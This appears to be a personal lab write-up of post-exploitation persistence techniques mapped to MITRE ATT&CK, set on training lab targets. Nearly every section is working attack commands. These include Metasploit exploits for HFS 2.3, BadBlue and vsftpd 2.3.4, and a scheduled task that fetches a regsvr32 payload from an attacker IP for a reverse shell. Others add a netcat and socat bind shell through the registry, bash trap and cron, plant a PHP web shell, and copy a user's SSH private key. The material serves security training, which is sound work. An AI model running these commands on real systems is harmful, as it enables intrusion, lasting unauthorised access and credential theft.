Tactics: Persistence or Maintaining Access

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off 
their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking
legitimate code or adding startup code.

Techniques: schedule task : create a schedule task which will run automatically when user login on the compromised system.

Scheduled Task/Job : Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating
systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met
(ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged 
group on the remote system.

Procedure: 

I have done one lab of "Maintaining Access: Schtasks" in which firstly i have performed fingerprint of the target by using NMAP and i have found multiple ports are open
including port 80 and then now i have run NMAP gain to find out the version of service running on port 80 (nmap -sV -p 80 target ip). Once command completed i have observed that
httpFileServer 2.3 running on port 80 in target system. Now i am searching for any exploit for hfs 2.3 (searchsploit hfs) and found Rejetto HTTP File Server (HFS) 2.3 is vulnerable
to RCE.Now first phase completed.

Now open metasploit framework (msfconsole -q) and load exploit (exploit/windows/http/rejetto_hfs_exec) and also checke options and set values of all required parameters and
exploit the target.We have successfully exploit the target and get a meterpreter shell. Now 2nd phase completed.

Now i am checking the current user which i got after exploitation and got to know that i am running as administrator user so now i am going to elevate to the system priviege
to NT authrority (getsystem).After running getsystem i have elevated my privilege and now running as NT Authroity System and then
migrate current process to lsass.exe (ps -S lsass.exe ==> migrate pid of lsass.exe) because when we exploit any system,at that
time we are using temporary process and that process kill or terminate any time thatswhy we are migrating that process to 
permanent running processes like explorer.exe or lsass.exe. Now 3rd phase completed.

In this case i am going to configure a persistence backdoor using the exploit/multi/script/web_delivery metasploit module.
So we will generate a Regsvr32 malicious web delivery link for the persistence access. Then we will use the generated link
to create a taskthat will trigger the malicious link every time the user login into the system.

For generating malicious link, i am going to start another metasploit framework (msfconsole -q) and use below commands:
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST Attacker_IP
set target 3
exploit

Once above module runs, i will get a malicious link like "regsvr32 /s /n /u /i:http://attacker_ip:8080/5oq2CIKAnPFv08.sct scrobj.dll"
Now 4th phase completed.

Now i have to create a schedule task in the compromised system so go to meterpreter shell and load powershell (load powershell) 
and after loading run this command powershell_shell. Powershell is loaded now i am going to run schtaks to schedule a task that executes
powershell.exe to launch a malicious link on logon with system privilege.

schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u
/i:http://10.10.1.4:8080/5oq2CIKAnPFvO8.sct scrobj.dll'" /sc onlogon /ru System
Once above command execute successfully, a new schedule task named "AttackDefense" created.Now 5th phase completed.

Now if user of compromised system reboot their machine and system started, my scheduled task executed because i have added a condition
whenever user login my task executed and a reverse shell created towards my attacker ip.
But in my lab scenerio i have to reboot compomised machine, to do this firstly i have to back from powershell prompt so use ctrl+c
and now i am in meterpreter shell and run "reboot". Now 6th phase completed.

Once machine comes up and user login again, my schedule task runs and malicious link executed and i will get a meterpreter 
session on my attacker machine where i executed metasploit module for generating malicious link.

In this way we are maintaining access or creating persistence on compromised system. Now i am not going to exploit again and again
if compromised system reboot or shutdown because i have created a backdoor which executes whenever user login on the system.

===============================================complete============================================

Technique 2: Modifying in registry key "Run" by adding netcat utility.

Procedure:

In this lab, firstly we will perform fingerprint the target with the help of NMAP tool (nmap target_ip). In the output of nmap
we have observed that port 80 is open but to know the version of service we will again run nmap (nmap -sV -p 80 target_IP).
From output of nmap we come to know that badblue 2.7 is running on target machine on port 80. Now 1st phase is completed.

Now we will search exploit for badblue 2.7 so we will use CLI command searchsploit (searchsploit badblue 2.7) to find out
the exploit. Also we can use Exploitdb site to find out the exploit. After running searchsploit command, we have found one
exploit for metasploit "exploit/windows/http/badblue_passthru". Now we will load this exploit in metasploit framework and set required 
parameters by set RHOSTS.
use exploit/windows/http/badblue_passthru
set RHOSTS target_ip
exploit

We have successfully exploited the target vulnerable application i.e badblue and recieved a meterpreter shell. Now 2nd phase
completed.

After exploitation, firstly we check the user(getuid) and found that we are running as administrator user. Now we are migrating 
our temporary process to permanent process.For this first we check the pid of explorer.exe (ps -S explorer.exe) and once found
the PID, migrate (migrate PID of Explorer.exe) to explorer.exe. Now 3rd completed.

Now we are going to maintain access or Persistence using Netcat utility. We will upload nc.exe on the target machine and modify
the registry to have Netcat execute on startup and listen on port 443.

Upload Netcat i.e nc.exe (In meterpreter shell we will use this command: upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32)
From above command, we have uploaded nc.exe in the "C:\windows\system32" directory.

Now modifying the registry to start netcat on startup.Below is the command which we use to modify registry by adding nc.exe:

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'

Now we have modify the registry.For verifying added value we will use below command:

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

We have successfully configured the Netcat persistence backdoor.

Now if compromised system rebooted still we are able to connect the victim because we have added netcat utility which listen on port 443
in the startup registry.
In my lab scenerio, i am going to reboot the target system and once system start our netcat utility execute process start on port 443. To confirm 
this i will run namp from my attacker machine and in output i have observed now port 443 is exposed which was not exposed in the 1st phase.

Everything is set, now i am going to connect target on port 443 using netcat from attacker machine:

nc -v taget_ip 443

Now i have connected with victim's system. This is the 2nd way how we can create Persistence from netcat utility. Now whenever i want
to connect with compromised system, i will connect with netcat utility on port 443.

========================================================Completed===============================

Technique 3: Port knocking (T1205)

Port knocking is a security technique used to protect network services from unauthorized access or port scans. 
It involves dynamically opening network ports on a firewall or network device in a specific sequence or pattern. 
The idea is that the ports are initially closed, and a client must "knock" on these ports in a predefined sequence 
before access is granted to the desired service.

How port knocking generally works:

Closed Ports: By default, the network ports that lead to a particular service are closed on the firewall.

Port Knocking Sequence: To gain access to the service, a user or system must send a series of connection attempts (knocks) to a predefined sequence of closed ports.

Firewall Rules Modification: The firewall or security device monitoring these ports detects the correct sequence of knocks.

Temporary Opening of Ports: Upon detecting the correct sequence, the firewall dynamically opens the necessary ports for a limited time, allowing the client to connect to the desired service.

Access Granted: The client can now access the service because the required ports are temporarily open.

Ports Automatically Close: After a certain period of inactivity or a predefined timeout, the opened ports automatically close, reducing the exposure of the system to potential attacks.

The primary advantages of port knocking include:

Stealth: Since the ports are closed by default, the services are not easily discoverable by port scans.

Enhanced Security: It adds an additional layer of security by requiring a specific sequence of port knocks, making it more difficult for attackers to guess or automate the process.

Reduced Attack Surface: The services are only exposed when the correct sequence is provided, reducing the attack surface and exposure to potential threats.

Procedure:

In this lab, we have to figure out the port knocking pattern, perform the knock and once its successful ssh service is expose.

Firstly we will check the open port on target with the help of nmap.But by default in port knocking al ports showing closed.
In our lab, it is clear that the following ports are open on the target machine i.e 7000,8000,9000 and tcp flags are FIN and URG.

Each ports need n number of packets where 4 < n < 10

so, send 9 packets of TCP URG and FIN flag to each port.

Command used:

hping3 -c 9 -F -p 7000 target_IP [F=FIN]
hping3 -c 9 -U -p 7000 target_IP [U=URG]
hping3 -c 9 -F -p 8000 target_IP 
hping3 -c 9 -U -p 8000 target_IP 
hping3 -c 9 -F -p 9000 target_IP 
hping3 -c 9 -U -p 9000 target_IP 

In this format i have send 9 packets.Once all packets sent to target,automatically port 22 is exposed.To verify this use
nmap -p- targetIP

Once port 22 is showing open on target machine then we will ssh the target server with the steal credentials and now we are successfully
login on target system.

Now we know the pattern so in future anytime we will send packet in the specific pattern and by doing this ssh service will expose 
and now we can login with the credentials.

## How attackers uses Port Knocking mechanism to create persistence:

Port knocking can also be exploited by attackers to create persistence on a compromised system. Here's a scenario to help illustrate how an attacker might use port knocking for persistence:

Initial Compromise:

The attacker gains access to a target system through a vulnerability, exploiting weak credentials, or through other means.

Exploration and Reconnaissance:

After gaining access, the attacker explores the system to understand its architecture, firewall rules, and services running.

Identifying Port Knocking:

The attacker identifies that the target system is using port knocking for security. They observe the network traffic and
identify the specific sequence of port knocks required to open up certain ports.

Creating a Backdoor:

The attacker wants to maintain access to the compromised system even if the initial point of entry is discovered and closed. 
They decide to use the port knocking mechanism for persistence.

Implementing the Attack:

The attacker sets up a malicious service on the compromised system that listens for the specific sequence of port knocks. 
This service is designed to trigger the creation of a backdoor or open a hidden channel once the correct sequence is received.

Initiating the Knock Sequence:

To maintain access, the attacker initiates the correct sequence of port knocks from an external location. 
This could be done using a script or a tool specifically designed for port knocking.

Triggering Persistence:

Once the correct knock sequence is received by the malicious service, it modifies firewall rules or opens a hidden 
communication channel, allowing the attacker to access the system at will.

========================================completed==========================

Techique 4: T1546.005 : Trap

Trap command allows the program/shell to specify commands that need to be executed on receiving pre-defined interrupt 
signals (e.g. ctrl+c, ctrl+d).

Procedure:

In this lab, we are given SSH access on the target machine. The flag is not on the machine yet. Once the "wait" file 
present in the user's home directory is deleted, the real user will log into the systems and save the flag in the user's 
home directory.  However, on the deletion of this file, the password will be changed, SSH will be restarted and all 
newly started processed will be killed. Also, any maintaining access method deployed before the user sends Ctrl+C 
signal might get killed. So, it is advisable to deploy the mechanism after the user sends Ctrl+C.

Firstly we will connect to the target machine through the credentials provided in the lab because its a POST EXPLOITATION
technique, we assume that target already exploited, now we have to create a Persistence and capture the flag.

ssh student@target_IP
password:***********

Once we entered the credentials,we are successfully login to victim machine. 1st phase completed.

Now in ".bash_profile" file append the commands require to start a socat server when the logged in user hits CTRL+C.

echo "trap 'socat tcp-l:5000,fork system:/bin/bash &' 2" > .bash_profile

Above command explanation:

echo: The command to print or display text.

"trap 'socat tcp-l:5000,fork system:/bin/bash &' 2": The string or line of text being printed. This line sets up 
a trap in the .bash_profile file. It says that when the shell receives a SIGINT (interrupt) signal 
(usually generated by pressing Ctrl+C), it should execute the command 'socat tcp-l:5000,fork system:/bin/bash &'.

> .bash_profile: This part of the command redirects the output of the echo command to the .bash_profile file, 
effectively overwriting the file's contents with the new line.

Example: 

Suppose you execute the given command:

echo "trap 'socat tcp-l:5000,fork system:/bin/bash &' 2" > .bash_profile

After running this command, the content of the .bash_profile file would look like this:

trap 'socat tcp-l:5000,fork system:/bin/bash &' 2

Now, whenever you start a new interactive Bash shell session (e.g., by logging in), this .bash_profile script will be
executed, and it sets up a trap for the SIGINT signal. If, during the session, you press Ctrl+C to interrupt 
a running command, the specified socat command will be executed. This particular socat command is used for 
creating a reverse shell, opening a network connection to a specified host and port and executing /bin/bash 
on the connected machine.

Back to lab, we have setup our socat server, so now we will delete the "wait" file and once we deleted ssh session
terminated automatically as per lab.

rm wait

The SSH session is terminated

Now to confirm socat server start or not, we will do a nmap scan on target server

nmap -p- target_ip

In output, we have observed that port 5000 is open that means socat server has started on port 5000.

Now we are connecting to the socat server from our attacker machine:

socat - TCP:target_ip:5000

Now when user execute CTRL+C or CTRL=d, we will connect to the target machine.

This is the another way we can create a Persistence or Maintaining Access.

========================================completed=======================================

Technique 5: Create Persistence through WebShells

Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.

Procedure:

In this lab we have ssh credentials of target system because Persistence is a POST EXPLOITATION technique so we assume that we already exploited the target.

But in target there is one condition, there is one file named "wait", if we delete that file password of user "student" changes automatically and SSH session terminates.

For this condition to maintain access we have to use WebShell.

Now we are successfully login on target machine as a "student" user by below command

ssh student@target_IP
password:********

Now we are checking processes running on target 

ps -eaf

From above command, we come to know that Nginx web server and PHP fpm are running on the machine.

Now cheking whether the web root folder is world writable or not.

ls -l /var/www/

web root folder is world writable means everyone can write on this folder.

Since the web root directory is world writable. A PHP webshell can be created in the web root directory. Create a PHP webshell in /var/www/html directory.

<?php
$output=shell_exec($_GET["cmd"]);
echo $output;
?>
Now WebShell is created named "shell.php" so now we are going to delete "wait" file. Once we delete that file as per lab description our SSH session terminated.

rm wait

SSH session is terminated

Now we dont have new password of target server but we have created Persistence through the uploaded PHP WebShell.

So execute commands on the target machine:

curl "target_ip/shell.php?cmd=id"

Once we execute this command we get the output in attacker's machine. In this way we can create Persistence through WebShells.

============================================================Completed================================================

Technique 6: By scheduling "HTTP python server module" in cron

Procedure:

In this lab, we have to create a cron in which we start HTTP python server. 

First we will create this cron and as per lab if we delete "wait" file from user's home directory so our SSH session
get terminated.

echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron

crontan -i cron

crontab -l

So we created cron and deleted that wait file.Once we deleted our session terminated.

Now with help of curl command we will run commands on target because already we have started httpserver on the target.

curl target_ip:8000

curl target_ip:8000/flag.txt

So we can create Persistence or Maintain access on target by using "HTTP python Server module".

=====================================completed==================================================

Technique 7: T1505: Server Software Component : Server Software Component refers to adversaries leveraging other software/features present on the system to gain persistent access.

Procedure:

In this lab, we have to maintain access on victim's system because as per lab once we deleted "wait" file at the same time user's password changes automatically
and ssh session will be terminated.

So to create Persistence, we have to Check which command student user can execute as root.

sudo -l

Student user can execute “/usr/local/sbin/vsftpd” as root.

Check the vsftpd version:

vsftpd -v

vsftpd version 2.3.4

Now  Add a user cron job to start the vsftpd server which can later be leveraged to gain access on the target machine.

echo "* * * * * sudo /usr/local/sbin/vsftpd" > cron
crontab -i cron
crontab -l

Now we will Delete the wait file, once file deleted our SSH session will be terminated.

rm wait

Now our session is terminated so now we perform nmap scan and check whether port 21 is open:

nmap -p- target_ip

From above command output, we come to know port 21 is open on target machine thats mean vsftpd server has started.

As we know vsftpd version 2.3.4 is running so we will search for exploit for this version.

searchsploit vsftpd

We found one metasploit module for this version

msfconsole -q

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target_ip
exploit

Once above module executed, we get the command shell

id

Now we search for a flag

ls -l

cat flag.txt

In this way by running vsftpd service on target we will create Persistence because version of vsftpd is vulnerable of remote command execution.

======================================================completed=======================================

Technique 8: T1078: Valid Accounts

Valid Accounts refers to the usage of valid credentials to bypass access controls placed on various resources on systems 
within the network. These credentials can even be used to maintain persistent access to systems.

Lab Description: 

In this lab, we are given SSH access on the target machine. The flag is not on the machine yet and will only be 
available after the "wait" file present in the user home directory is deleted. However, the deletion of this file 
will change the user password and restart SSH. Hence, to retrieve the flag, we have to maintain access on the target system.

Procedure:

Step1- Login to target server by using provided credentials

ssh student@target_ip
enter password

Step2-Enumerate files present in home directory

ls -al

Step3-We found that SSH key pair is present in the ".ssh" directory.

Step4-Now exit SSH session and copy ssh private key to attacker machine.

scp student@target_ip:~/.ssh/id_rsa
enter password

Now fle is successfully copied.

Step5-Now SSH into student machine and delete the wait file.

ssh student@target_ip
password
rm wait
Once "wait" file is deleted, flag is available in target machine but ssh session terminated.

Step6-Now we will SSH into the target machine with the private key.

But firstly we need to change the permission to 400 (The owner of the file has read permission (4) but no write or execute permissions)
and then will use this file "id_rsa" for ssh.

chmod 400 id_rsa
ssh -i id_rsa student@target_ip (No need to enter password now)

Successfully login to victim system and search for flag file.

In this way with the help of id_rsa(ssh private key) we can create a persistence on target system.

===========================================completed========================================

Technique 9: T1108: Redundant Access

Redundant Access refers to various command and control protocols or credentialed access to remote services to maintain 
access.

Redundant access typically refers to having multiple means of accessing a system or resource that serve the same purpose. 
In the context of security, redundant access can be considered a vulnerability because it increases the attack surface and 
provides additional entry points for potential attackers.

For example, imagine a system with SSH (Secure Shell) access enabled for administrative purposes. If an administrator 
also sets up a separate backdoor using a different method, such as opening a TCP port and spawning a shell, 
this would be redundant access. Both SSH and the backdoor provide a way for someone to gain unauthorized access 
to the system. If the backdoor is discovered by an attacker, it could be exploited to compromise the system, 
even if SSH access is properly secured.

In this technique, attacker has target machine access so SSH into the target machine.

Now check current processes running on target system.
ps -eaf

We come to know that cron service is running so add a new cron

echo "* * * * * socat tcp-l:7000,fork system:/bin/bash" > cron

Above line, when added to a crontab file, schedules the execution of the socat command every minute. 
The socat command establishes a TCP listener on port 7000 and, when a connection is made, 
forks a new process that executes /bin/bash, effectively allowing remote access to the system.

Now delete a "wait" file and our SSH session terminated because as per lab if "wait" file deleted so user password 
changes automatically.

Since socat server was started on port 7000, perform nmap scan to check whether port
7000 is open.

nmap -p 7000 target_ip

Connect to the socat server and execute system commands:

socat - TCP:target_ip:7000

Now we are successfully login to target system and able to execute commands on target machine.

This is another way to create Persistence with the help of redundant access by using socat tool.

======================================completed=====================================
























